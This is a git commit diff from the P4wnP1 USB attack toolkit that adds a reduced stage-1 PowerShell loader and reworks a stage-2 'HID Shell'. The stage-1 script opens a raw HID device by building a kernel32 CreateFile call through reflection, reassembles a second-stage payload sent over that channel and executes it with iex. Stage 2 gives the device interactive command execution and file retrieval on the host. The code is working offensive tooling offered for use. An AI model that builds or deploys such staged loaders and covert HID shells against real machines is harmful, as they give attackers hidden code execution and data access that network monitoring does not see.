c22c7e4eb92ef2749565fc423dbb78ab3779e06d
mame82 <mame8282@googlemail.com>
2017-03-15 17:56:17 +0000

    major change

---
+++ hidtools/stage1_reduced.ps1
@@ -0,0 +1,152 @@
+# P4wnP1 HID Script
+$USB_VID="1D6B"
+$USB_PID="0137"
+
+function ReflectCreateFileMethod()
+{
+    $dom = [AppDomain]::CurrentDomain
+    $da = New-Object Reflection.AssemblyName("MaMe82DynAssembly")
+    $ab = $dom.DefineDynamicAssembly($da, [Reflection.Emit.AssemblyBuilderAccess]::Run)
+    $mb = $ab.DefineDynamicModule("MaMe82DynModule", $False)
+    $tb = $mb.DefineType("MaMe82", "Public, Class")
+    $cfm = $tb.DefineMethod("CreateFile", [Reflection.MethodAttributes] "Public, Static", [IntPtr], [Type[]] @([String], [Int32], [UInt32], [IntPtr], [UInt32], [UInt32], [IntPtr] )) 
+    $cdi = [Runtime.InteropServices.DllImportAttribute].GetConstructor(@([String]))
+    $cfa = [Reflection.FieldInfo[]] @([Runtime.InteropServices.DllImportAttribute].GetField("EntryPoint"), [Runtime.InteropServices.DllImportAttribute].GetField("PreserveSig"), [Runtime.InteropServices.DllImportAttribute].GetField("SetLastError"), [Runtime.InteropServices.DllImportAttribute].GetField("CallingConvention"), [Runtime.InteropServices.DllImportAttribute].GetField("CharSet"))
+    $cffva = [Object[]] @("CreateFile", $True, $True, [Runtime.InteropServices.CallingConvention]::Winapi, [Runtime.InteropServices.CharSet]::Auto)
+    $cfca = New-Object Reflection.Emit.CustomAttributeBuilder($cdi, @("kernel32.dll"), $cfa, $cffva)
+    $cfm.SetCustomAttribute($cfca)
+    $tb.CreateType()
+}
+
+function CreateFileStreamFromDevicePath($mmcl, [String] $path)
+{
+    # CreateFile method has to be built in [MaMe82]::CreateFile()
+    # call ReflectCreateFileMethod to achieve this
+
+    # Call CreateFile for given devicepath
+    # (GENERIC_READ | GENERIC_WRITE) = 0XC0000000
+    # FILE_FLAG_OVERLAPPED = 0x40000000;
+    $h = $mmcl::CreateFile($path, [Int32]0XC0000000, [IO.FileAccess]::ReadWrite, [IntPtr]::Zero, [IO.FileMode]::Open, [UInt32]0x40000000, [IntPtr]::Zero)
+
+    # Create SafeFileHandle from file 
+    #    Note: [Microsoft.Win32.SafeHandles.SafeFileHandle]::new() isn't accessible on PS 2.0 / NET2.0
+    #    thus we use reflection to construct FileStream
+    #$shandle = [Microsoft.Win32.SafeHandles.SafeFileHandle]::new($devicefile,  [System.Boolean]0)
+    $a = $h, [Boolean]0
+    $c=[Microsoft.Win32.SafeHandles.SafeFileHandle].GetConstructors()[0]
+    $h = $c.Invoke($a)
+
+    # Create filestream from SafeFileHandle
+    #$Device = [System.IO.FileStream]::new($h, [System.IO.FileAccess]::ReadWrite, [System.UInt32]32, [System.Boolean]1)
+    #    Note: again Reflection has to be used to access the constructor of FileStream
+    $fa=[IO.FileAccess]::ReadWrite
+    $a=$h, $fa, [Int32]64, [Boolean]1
+    $c=[IO.FileStream].GetConstructors()[14]
+    return $c.Invoke($a)
+}
+
+function send_data($file, $source, $dest, $data, $received)
+{
+
+    $i=0
+    $bytes = New-Object Byte[] (65)
+    $bytes[$i++] = [byte] 0
+    $bytes[$i++] = [byte] $source
+    $bytes[$i++] = [byte] $dest
+    $bytes[$i++] = [byte] $data.Length
+    $bytes[$i++] = [byte] $received
+    
+    $data.CopyTo($bytes, $i)
+    
+    $devfile.Write($bytes, 0, $bytes.Length)
+    
+   
+}
+
+
+function read_data($file)
+{
+    $r = New-Object Byte[] (65)    
+    $cr = $devfile.Read($r,0,65)
+    
+    $i=0
+    $report_id = $r[$i++]
+    $src = $r[$i++]
+    $dst = $r[$i++]
+    $snd = $r[$i++]
+    $rcv = $r[$i++]
+    
+    
+    $msg = New-Object Byte[] ($snd)
+    [Array]::Copy($r, $i, $msg, 0, $snd)
+    return $src, $dst, $snd, $rcv, $msg
+}
+
+function GetDevicePath($USB_VID, $USB_PID)
+{
+    $HIDGuid="{4d1e55b2-f16f-11cf-88cb-001111000030}"
+    foreach ($wmidev in gwmi Win32_USBControllerDevice |%{[wmi]($_.Dependent)} ) {
+        #[System.Console]::WriteLine($wmidev.PNPClass)
+	    if ($wmidev.DeviceID -match ("$USB_VID" + '&PID_' + "$USB_PID") -and $wmidev.DeviceID -match ('HID') -and -not $wmidev.Service) {
+            $devpath = "\\?\" + $wmidev.PNPDeviceID.Replace('\','#') + "#" + $HIDGuid
+        }
+    }
+    $devpath
+}
+
+#######
+# Init RAW HID device
+#########
+
+# Use Reflection to create [MaMe82]::CreateFile from kernel32.dll
+$mmcl = ReflectCreateFileMethod
+
+$path= GetDevicePath $USB_VID $USB_PID
+# create FileStream to device
+$devfile = CreateFileStreamFromDevicePath $mmcl $path
+$count = -1
+$stage2 = ""
+
+$empty = New-Object Byte[] (0)
+try 
+{
+    while ($devfile.SafeFileHandle -ne $null)
+    {
+        
+        send_data $devfile 0 0 $empty 0
+        $packet = read_data $devfile
+        if ($packet[0] -ne 0) 
+        { 
+            break  # src not 0, no heartbeat (carying stage2)
+        }
+        if ($packet[1] -ne 0) 
+        { 
+            break # dst not 0, no heartbeat (carying stage2)
+        }
+        $utf8 = [Text.Encoding]::UTF8.GetString($packet[4])
+        if ($utf8.StartsWith("end_heartbeat") -and ($count -gt 0)) 
+        { 
+            break 
+        } 
+        if ($utf8.StartsWith("begin_heartbeat"))
+        {
+           $count = 0
+           [Console]::WriteLine("Start receiving stage2")
+        }
+        elseif ($count -ge 0)
+        {
+            # belongs to stream, assemble
+            $stage2 += $utf8
+            $count += 1
+            [Console]::Write(".")
+        }
+    }
+    [Console]::WriteLine("stage2 reassembled")
+    iex $stage2
+}
+finally
+{
+    # end main thread
+    $devfile.Close()
+    $devfile.Dispose()
+}
--- hidtools/stage2.ps1
+++ hidtools/stage2.ps1
@@ -66,166 +66,6 @@
 #                 # echo back
 #                 f.write(hidin)
 
-function ReflectCreateFileMethod()
-{
-    $Domain = [AppDomain]::CurrentDomain
-    $DynAssembly = New-Object System.Reflection.AssemblyName("MaMe82DynAssembly")
-    $AssemblyBuilder = $Domain.DefineDynamicAssembly($DynAssembly, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
-    $ModuleBuilder = $AssemblyBuilder.DefineDynamicModule("MaMe82DynModule", $False)
-    $TypeBuilder = $ModuleBuilder.DefineType("MaMe82", "Public, Class")
-    # Define the CreateFile Method
-    $CreateFileMethod = $TypeBuilder.DefineMethod(
-        "CreateFile", # Method Name
-        [System.Reflection.MethodAttributes] "Public, Static", # Method Attributes
-        [IntPtr], # Method Return Type
-        [Type[]] @(
-            [String], # lpFileName
-            [Int32], # dwDesiredAccess
-            [UInt32], # dwShareMode
-            [IntPtr], # SecurityAttributes
-            [UInt32], # dwCreationDisposition
-            [UInt32], # dwFlagsAndAttributes
-            [IntPtr] # hTemplateFile
-        ) # Method Parameters
-    ) 
-
-    # Import DLL
-    $CreateFileDllImport = [System.Runtime.InteropServices.DllImportAttribute].GetConstructor(@([String]))
-
-    # Define Fields
-    $CreateFileFieldArray = [System.Reflection.FieldInfo[]] @(
-        [System.Runtime.InteropServices.DllImportAttribute].GetField("EntryPoint"),
-        [System.Runtime.InteropServices.DllImportAttribute].GetField("PreserveSig"),
-        [System.Runtime.InteropServices.DllImportAttribute].GetField("SetLastError"),
-        [System.Runtime.InteropServices.DllImportAttribute].GetField("CallingConvention"),
-        [System.Runtime.InteropServices.DllImportAttribute].GetField("CharSet")
-    )
-
-    # Define Values for the fields
-    $CreateFileFieldValueArray = [Object[]] @(
-        "CreateFile",
-        $True,
-        $True,
-        [System.Runtime.InteropServices.CallingConvention]::Winapi,
-        [System.Runtime.InteropServices.CharSet]::Auto
-    )
-
-    # Create a Custom Attribute and add to our Method
-    $CreateFileCustomAttribute = New-Object System.Reflection.Emit.CustomAttributeBuilder(
-        $CreateFileDllImport,
-        @("kernel32.dll"),
-        $CreateFileFieldArray,
-        $CreateFileFieldValueArray
-    )
-    $CreateFileMethod.SetCustomAttribute($CreateFileCustomAttribute)
-
-    # Create the Type within our Module
-    #$MaMe82 = $TypeBuilder.CreateType()
-    $TypeBuilder.CreateType()
-}
-
-function CreateFileStreamFromDevicePath($MaMe82Class, [String] $path)
-{
-    # CreateFile method has to be built in [MaMe82]::CreateFile()
-    # call ReflectCreateFileMethod to achieve this
-
-    # Call CreateFile for given devicepath
-    # (GENERIC_READ | GENERIC_WRITE) = 0XC0000000
-    # FILE_FLAG_OVERLAPPED = 0x40000000;
-    $handle = $MaMe82Class::CreateFile($path, [System.Int32]0XC0000000, [System.IO.FileAccess]::ReadWrite, [System.IntPtr]::Zero, [System.IO.FileMode]::Open, [System.UInt32]0x40000000, [System.IntPtr]::Zero)
-
-    # Create SafeFileHandle from file 
-    #    Note: [Microsoft.Win32.SafeHandles.SafeFileHandle]::new() isn't accessible on PS 2.0 / NET2.0
-    #    thus we use reflection to construct FileStream
-    #$shandle = [Microsoft.Win32.SafeHandles.SafeFileHandle]::new($devicefile,  [System.Boolean]0)
-    $a = $handle, [Boolean]0
-    $c=[Microsoft.Win32.SafeHandles.SafeFileHandle].GetConstructors()[0]
-    $shandle = $c.Invoke($a)
-
-    # Create filestream from SafeFileHandle
-    #$Device = [System.IO.FileStream]::new($shandle, [System.IO.FileAccess]::ReadWrite, [System.UInt32]32, [System.Boolean]1)
-    #    Note: again Reflection has to be used to access the constructor of FileStream
-    $fa=[System.IO.FileAccess]::ReadWrite
-    $a=$shandle, $fa, [System.Int32]64, [System.Boolean]1
-    $c=[System.IO.FileStream].GetConstructors()[14]
-    $Device = $c.Invoke($a)
-    
-
-    return $Device
-}
-
-function send_data($file, $source, $dest, $data, $received)
-{
-    $report_id = [byte] 0
-    $src = [byte] $source
-    $dst = [byte] $dest
-    $snd = [byte] $data.Length
-    $rcv = [byte] $received
-    
-    $i=0
-    $bytes = New-Object Byte[] (65)
-    $bytes[$i++] = $report_id
-    $bytes[$i++] = $src
-    $bytes[$i++] = $dst
-    $bytes[$i++] = $snd
-    $bytes[$i++] = $rcv
-    
-    $data.CopyTo($bytes, $i)
-    
-    $devfile.Write($bytes, 0, $bytes.Length)
-    
-   
-}
-
-function read_data($file)
-{
-    $r = New-Object Byte[] (65)
-    #$cr = $devfile.Read($r,0,65)
-    # a normal read as used above is a blocking call
-    # so we wouldn't be able to send own data, untin the other side sends something
-    # this should be avoided by using a heartbeat, to asure permanent packet exchange
-    # a heart beat is sent with
-    #    src = 0
-    #    dst = 0
-    #    payload = ""
-    $asyncReadResult = $devfile.BeginRead($r, 0, 65, $null, $null)
-    while (-not $asyncReadResult.IsCompleted)
-    {
-        # Sending heartbeat data if needed, heartbeat otherwise
-        $heartbeat = New-Object Byte[] (0)
-        #send_data $devfile 0 0 $heartbeat 0
-    }
-    $cr = $devfile.EndRead($asyncReadResult)
-    
-
-    $i=0
-    $report_id = $r[$i++]
-    $src = $r[$i++]
-    $dst = $r[$i++]
-    $snd = $r[$i++]
-    $rcv = $r[$i++]
-    
-    
-    $msg = New-Object Byte[] ($snd)
-    
-    [Array]::Copy($r, $i, $msg, 0, $snd)
-    
-       
-    # msg
-    return $src, $dst, $snd, $rcv, $msg
-}
-
-function GetDevicePath($USB_VID, $USB_PID)
-{
-    $HIDGuid="{4d1e55b2-f16f-11cf-88cb-001111000030}"
-    foreach ($wmidev in gwmi Win32_USBControllerDevice |%{[wmi]($_.Dependent)} ) {
-        #[System.Console]::WriteLine($wmidev.PNPClass)
-	    if ($wmidev.DeviceID -match ("$USB_VID" + '&PID_' + "$USB_PID") -and $wmidev.DeviceID -match ('HID') -and -not $wmidev.Service) {
-            $devpath = "\\?\" + $wmidev.PNPDeviceID.Replace('\','#') + "#" + $HIDGuid
-        }
-    }
-    $devpath
-}
 
 function L4fragment_rcvd($qin, $fragment_assembler, $src, $dst, $data)
 {
@@ -266,8 +106,13 @@ function L4fragment_rcvd($qin, $fragment_assembler, $src, $dst, $data)
         {
             # new stream_id, we have to add a new stream to collect fragments
             $fragment_assembler.Add($stream_id, ($src, $dst, $data))
-        }
-        
+        }    
+    }
+    else
+    {
+        # heartbeat... do nothing
+        #$msg = [System.Text.Encoding]::UTF8.GetString($data)
+        #[System.Console]::WriteLine("Heartbeatdata: $msg")
     }
 }
 
@@ -292,7 +137,6 @@ function L4send_datastream($qout, $src, $dst, $data)
     # add chunk to output queue
     $qout.Enqueue($chunk)
 }
-
 
 $script_mainloop = {
 
@@ -349,7 +193,12 @@ $script_mainloop = {
 }
 
 $script_hid_in_loop = {
-    # handle inpput data
+    # handle input data
+    # dst=1   stdin (not used, we don't allow P4wnP1 server to give input at the moment)
+    # dst=2   stdout
+    # dst=3   stderr
+    # dst=4   stream assembler
+    # dst=?   print unknown stream
     while ($true)
     {
         # $hostui.WriteLine("loop") # testoutput to check if thread isn't blocked
@@ -360,23 +209,111 @@ $script_hid_in_loop = {
             $dst = $input[1]
             $stream = $input[2]
             #$hostui.WriteLine("Stream in input queue src $src dst $dst")
-            $hostui.WriteLine([System.Text.Encoding]::UTF8.GetString($stream))
+            
+            if ($dst -eq 2)
+            {
+                $hostui.WriteLine([System.Text.Encoding]::UTF8.GetString($stream))
+            }
+            elseif ($dst -eq 3)
+            {
+                $hostui.WriteErrorLine([System.Text.Encoding]::UTF8.GetString($stream))
+            }
+            elseif ($dst -eq 4)
+            {
+                $msg = [System.Text.Encoding]::UTF8.GetString($stream)
+                $hostui.WriteLine("getfile response: $msg")
+            }
+            else
+            {
+                $msg = "Stream received for unhandled dst $dst"
+                $hostui.WriteLine($msg)
+                $hostui.WriteLine([System.Text.Encoding]::UTF8.GetString($stream))
+            }
         } 
     }
 }
 
-#######
-# Init RAW HID device
-#########
 
-# Use Reflection to create [MaMe82]::CreateFile from kernel32.dll
-$MaMe82Class = ReflectCreateFileMethod
-# Device Path, could be enumerate via WMI
-$USB_VID="1D6B"
-$USB_PID="0137"
-$path= GetDevicePath $USB_VID $USB_PID
-# create FileStream to device
-$devfile = CreateFileStreamFromDevicePath $MaMe82Class $path
+# note:
+#    dst=1 indicates a bash command for the python server
+#    dst=2 indicates a file request (returns file content as base64 string)
+$script_hid_out_loop = {
+    # the try block is only needed to run the finally block and destroy threads on unexpected exit (CTRL+C, exit command ...)
+
+    # Sleep to allow HID in thread to print output, before prompt is shown
+    #Start-Sleep 1
+    
+    function printhlp()
+    {
+        $host.UI.WriteLine("P4wnP1 HID Shell  by MaMe82")
+        $host.UI.WriteLine("===========================")
+        $host.UI.WriteLine("")
+        $host.UI.WriteLine("Usage")
+        $host.UI.WriteLine("    '!!<command>'    run local powershell commands.")
+        $host.UI.WriteLine("                     Example: !!Get-Date")
+        $host.UI.WriteLine("")
+        $host.UI.WriteLine("    '!<command>'     run remote bash commands on P4wnP1.")
+        $host.UI.WriteLine("                     Example: !pwd")
+        $host.UI.WriteLine("")
+        $host.UI.WriteLine("    '!reset_bash'    Restarts the bash on P4wnP1")
+        $host.UI.WriteLine("                       This is only needed if the underlying bash doesn't")
+        $host.UI.WriteLine("                       respond. This could for example happen if an inter-")
+        $host.UI.WriteLine("                       active command like 'base64' is issued")
+        $host.UI.WriteLine("                       The new bash process is started with a new and empty")
+        $host.UI.WriteLine("                       environment")
+        $host.UI.WriteLine("")
+        $host.UI.WriteLine("    'help'           print this helpscreen")
+        $host.UI.WriteLine("    'exit'           exit the client")
+        $host.UI.WriteLine("")
+    }
+    printhlp
+
+    #Write-Host -NoNewline "P4wnP1 HID Shell >> "
+    
+    while ($true)
+    {
+        # !! read-host seems to block the UI and thus the HID_in thread, when i tries to print out data
+        # this could be circumvented by checking console input for "keyAvailable"
+        # the shortcoming is, that this couldn't be used on ISE
+        if ([Console]::KeyAvailable) 
+        { 
+            $in = read-host  
+            # exit loop if input is "exit"
+            if ($in -eq "exit") { break }
+            if ($in -eq "help")
+            {
+                printhlp
+            }
+            elseif ($in.StartsWith("getfile"))
+            {
+                # no argument error handling
+                #   arg0 - file to receive
+                #   arg1 - name of var to save file to
+                $inbytes =[system.Text.Encoding]::UTF8.GetBytes($in)
+                L4send_datastream $L4qout 1 4 $inbytes
+            }
+            elseif ($in.StartsWith("!!"))
+            {
+                $pscommand = $in.Split("!!")[2]
+                if ($pscommand.Length -gt 0) { iex $pscommand }
+            }
+            elseif ($in.StartsWith("!"))
+            {
+                $remotecommand = $in.Split("!")[1]
+                $inbytes =[system.Text.Encoding]::UTF8.GetBytes($remotecommand)
+                L4send_datastream $L4qout 1 1 $inbytes # send to stdin of P4wnP1 background process (bash)
+            }
+            else
+            {
+                $host.UI.WriteErrorLine("Unknown P4wnP1 command: $in")
+                $host.UI.WriteErrorLine("Enter 'help' for usage")
+                #$inbytes =[system.Text.Encoding]::UTF8.GetBytes($in)
+                #L4send_datastream $L4qout 1 255 $inbytes
+            }
+            #Write-Host -NoNewline "P4wnP1 HID Shell >> "
+        }
+    }
+}
 
 
 
@@ -393,17 +330,17 @@ $L4qout = New-Object System.Collections.Queue
 # create session state with needed functions for runspace
 
 #$iss = [initialsessionstate]::Create()
-$iss = [InitialSessionState]::CreateDefault()
+$iss = [Management.Automation.Runspaces.InitialSessionState]::CreateDefault()
 
 $def_read_data = Get-Content Function:\read_data -ErrorAction Stop
-$ssfe_read_data = New-Object System.Management.Automation.Runspaces.SessionStateFunctionEntry -ArgumentList ‘read_data’, $def_read_data
+$ssfe_read_data = New-Object System.Management.Automation.Runspaces.SessionStateFunctionEntry -ArgumentList 'read_data', $def_read_data
 $iss.Commands.Add($ssfe_read_data)
 
 $def_send_data = Get-Content Function:\send_data -ErrorAction Stop
-$ssfe_send_data = New-Object System.Management.Automation.Runspaces.SessionStateFunctionEntry -ArgumentList ‘send_data’, $def_send_data
+$ssfe_send_data = New-Object System.Management.Automation.Runspaces.SessionStateFunctionEntry -ArgumentList 'send_data', $def_send_data
 $iss.Commands.Add($ssfe_send_data)
 $def_fragment_rcvd = Get-Content Function:\L4fragment_rcvd -ErrorAction Stop
-$ssfe_fragment_rcvd = New-Object System.Management.Automation.Runspaces.SessionStateFunctionEntry -ArgumentList ‘L4fragment_rcvd’, $def_fragment_rcvd
+$ssfe_fragment_rcvd = New-Object System.Management.Automation.Runspaces.SessionStateFunctionEntry -ArgumentList 'L4fragment_rcvd', $def_fragment_rcvd
 $iss.Commands.Add($ssfe_fragment_rcvd)
 
 # create runspace for main thread
@@ -438,7 +375,7 @@ $handle_hid_in = $ps_hid_in.BeginInvoke()
 
 
 # Enque some outbound test data
-$msg="Hello to P4wnP1, this message got has been sent through the HID interface!"
+$msg="This text has been sent from PowerShellClient through a HID device and was printed on P4wnP1 with python"
 $testdata=[system.Text.Encoding]::UTF8.GetBytes($msg)
 L4send_datastream $L4qout 3 4 $testdata
 
@@ -447,46 +384,10 @@ L4send_datastream $L4qout 3 4 $testdata
 # finally assures the runspaces (threads) are killed 
 
 
-# HID output loop (console input loop)
+# HID output loop (=console input loop)
 try 
 {
-    # the try block is only needed to run the finally block and destroy threads on unexpected exit (CTRL+C, exit command ...)
-
-    # Sleep to allow HID in thread to print output, before prompt is shown
-    Start-Sleep 1
-
-    $host.UI.WriteLine("P4wnP1 HID Shell  by MaMe82")
-    $host.UI.WriteLine("===========================")
-    $host.UI.WriteLine("")
-    $host.UI.WriteLine("Use '!!!' to run powershell commands.")
-    $host.UI.WriteLine("Example: !!!Get-Date")
-    $host.UI.WriteLine("")
-
-    #Write-Host -NoNewline "P4wnP1 HID Shell >> "
-    
-    while ($true)
-    {
-        # !! read-host seems to block the UI and thus the HID_in thread, when i tries to print out data
-        # this could be circumvented by checking console input for "keyAvailable"
-        # the shortcoming is, that this couldn't be used on ISE
-        if ([Console]::KeyAvailable) 
-        { 
-            $in = read-host  
-            # exit loop if input is "exit"
-            if ($in -eq "exit") { break }
-            if ($in.StartsWith("!!"))
-            {
-                $pscommand = $in.Split("!!")[2]
-                if ($pscommand.Length -gt 0) { iex $pscommand }
-            }
-            else
-            {
-                $inbytes =[system.Text.Encoding]::UTF8.GetBytes($in)
-                L4send_datastream $L4qout 1 1 $inbytes
-            }
-            #Write-Host -NoNewline "P4wnP1 HID Shell >> "
-        }
-    }
+    iex $script_hid_out_loop.toString()
 }
 finally
 {
